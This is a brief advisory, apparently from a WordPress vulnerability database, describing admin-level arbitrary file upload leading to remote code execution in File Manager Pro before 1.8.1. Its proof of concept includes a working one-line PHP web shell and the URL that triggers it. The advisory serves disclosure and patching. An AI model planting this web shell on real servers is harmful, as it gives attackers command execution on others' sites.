## WordPress Plugin Vulnerabilities

# File Manager Pro < 1.8.1 - Admin+ Remote Code Execution

### Description

The plugin allows admin users to upload arbitrary files, even in environments where such a user should not be able to gain full control of the server, such as a multisite installation. This leads to remote code execution.

### Proof of Concept

As an admin, use the File Manager UI to upload a file `shell.php` with the following contents:
<?php echo system($\_GET['cmd']);
Visit `/shell.php?cmd=id` to trigger RCE.
